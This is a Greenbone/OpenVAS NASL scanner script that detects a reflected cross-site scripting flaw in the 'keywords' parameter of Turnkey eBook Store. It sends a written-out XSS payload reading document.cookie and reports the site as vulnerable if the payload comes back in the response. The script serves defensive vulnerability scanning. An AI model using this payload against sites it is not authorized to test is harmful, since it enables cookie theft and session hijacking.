if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100098" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2009-04-02 19:55:50 +0200 (Thu, 02 Apr 2009)" );
	script_bugtraq_id( 34324 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "Turnkey eBook Store 'keywords' Parameter Cross Site Scripting Vulnerability" );
	script_tag( name: "qod_type", value: "remote_probe" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2009 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "Turnkey eBook Store is prone to a cross-site scripting vulnerability." );
	script_tag( name: "insight", value: "An attacker may leverage this issue to execute arbitrary script code
  in the browser of an unsuspecting user in the context of the affected
  site and to steal cookie-based authentication credentials." );
	script_tag( name: "affected", value: "Turnkey eBook Store 1.1 is vulnerable, other versions may also be
  affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = NASLString( dir, "/index.php?cmd=search&keywords=\"><script>alert(document.cookie);</script>" );
	if(http_vuln_check( port: port, url: url, pattern: "<script>alert\\(document\\.cookie\\);</script>", check_header: TRUE )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

